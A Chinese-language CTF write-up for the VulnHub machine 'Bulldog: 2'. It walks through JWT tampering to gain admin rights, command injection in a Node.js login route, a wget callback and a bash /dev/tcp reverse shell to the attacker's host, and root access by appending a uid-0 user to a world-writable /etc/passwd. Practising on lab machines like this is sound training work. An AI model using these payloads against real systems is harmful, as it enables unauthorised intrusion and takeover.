# BULLDOG: 2

2025.02.15 https://www.vulnhub.com/entry/bulldog-2,246/

[video](https://www.bilibili.com/video/BV1FWATeHE2D/?spm_id_from=333.1387.0.0&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

只开放了一个 80 web 端口，进行相关浏览，发现一个用户列表的页面 http://192.168.5.40/users 同时发现了一个 json 的请求接口 http://192.168.5.40/users/getUsers?limit= 可以把所有的用户列表获取出来有 1 万多个用户。同时发现一个可以获取用户信息的 json 接口 http://192.168.5.40/users/profile/salaney 最后的值是用户名，将上述 getUsers 接口获得的用户名，进行遍历，但是权限都是 standard_user。

另外发现一个登陆页面： http://192.168.5.40/login 调用的认证接口是:

```
POST /users/authenticate HTTP/1.1
{
  "username": "eitobias",
  "password": "eitobias"
}
```

但是上面发现的用户名太多了，爆破不现实。

在找其他的接口吧，FindSometing 发现了一个注册接口 http://192.168.5.40/users/register 看看注册需要什么字段，查询下 js 源码：

```
prototype.onRegisterSubmit = function() {
var l = this
    , n = {
    name: this.name,
    email: this.email,
    username: this.username,
    password: this.password
};
```

自己构造上面的注册请求：

```
curl -XPOST http://192.168.5.40/users/register -H 'content-type:application/json' -d '{ "name":"test", "email":"test@test.com",  "username":"test", "password":"test"}'

{"success":true,"msg":"User registered"}
```

表示用户注册成功，使用 test:test 用户凭据登陆，登陆后，发现返回的数据：

```
{
  "success": true,
  "token": "JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJ0ZXN0IiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwidXNlcm5hbWUiOiJ0ZXN0IiwiYXV0aF9sZXZlbCI6InN0YW5kYXJkX3VzZXIifSwiaWF0IjoxNzM5NjEyODM4LCJleHAiOjE3NDAyMTc2Mzh9.l3bpZfElVpA_iv83MTeOeyA5sIm28yGsZMBViKHKaCg",
  "user": {
    "name": "test",
    "username": "test",
    "email": "test@test.com",
    "auth_level": "standard_user"
  }
}
```

发现使用了 JWT，并且 auth_level 为普通用户，尝试修改其为管理员权限，在源码中找到了对应的管理员权限的值为 master_admin_user 在浏览器中将本地存储空间中存储的值修改为：

```
{"name":"test","username":"test","email":"test@test.com","auth_level":"master_admin_user"}
```

同时在 https://jwt.io/ 中将 jwt 的值相应字段也进行修改：

```
JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJ0ZXN0IiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwidXNlcm5hbWUiOiJ0ZXN0IiwiYXV0aF9sZXZlbCI6Im1hc3Rlcl9hZG1pbl91c2VyIn0sImlhdCI6MTczOTYxMjgzOCwiZXhwIjoxNzQwMjE3NjM4fQ.XpfhMO48x_txPVCo8lotQame0ONAgr8ujmhilY-GOi0
```

这时在刷新页面右上角出现了 Admin 功能菜单，点击后出现了一个 Link+ Login 的功能页面，里面也要输入用户名和密码，可能存在 sql 注入，加上双引号，看看会出现什么：

```
POST /users/linkauthenticate HTTP/1.1
{
  "username": "11"",
  "password": "11""
}
```

看到报错提示解析 JSON 错误：/var/www/node/Bulldog-2-The-Reckoning/node_modules/raw-body/index.js:273:7，在 github 上找到了 Bulldog-2-The-Reckoning 的源码，这里发现可以命令执行 https://github.com/Frichetten/Bulldog-2-The-Reckoning/blob/master/routes/users.js 78 行:

```
router.post('/linkauthenticate', (req, res, next) => {
  const username = req.body.password;
  const password = req.body.password;

  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) => {
```

需要构造特殊的 username 和 password 先进行个测试看看能不能访问到 kali：

```
curl -XPOST http://192.168.5.40/users/linkauthenticate -H 'content-type:application/json' -d '{"username":"test", "password":"$(wget http://192.168.5.3)"}'
```

在 kali 的 python web 服务上可以看到目标机器的访问：

```
192.168.5.40 - - [15/Feb/2025 18:12:20] "GET / HTTP/1.1" 200 -
192.168.5.40 - - [15/Feb/2025 18:12:20] "GET / HTTP/1.1" 200 -
```

这时就能执行反弹了：

```
curl -XPOST http://192.168.5.40/users/linkauthenticate -H 'content-type:application/json' -d '{"username":"test", "password":"`/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1\"`"}'
```

kali 监听 8888 端口，得到了反弹的连接：

```
node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ id
id
uid=1001(node) gid=1005(node) groups=1005(node)
```

进行信息枚举，直接发现 /etc/passwd 可以全局写，所以直接添加一个超级权限级别用户：

```
openssl passwd -1 -salt new 123

echo 'admin1:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

su 切换到 admin1 用户，直接得到了 root 权限：

```
root@bulldog2:~# cat flag.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

I'm already working on another more challenging VM. Follow me for updates.
```
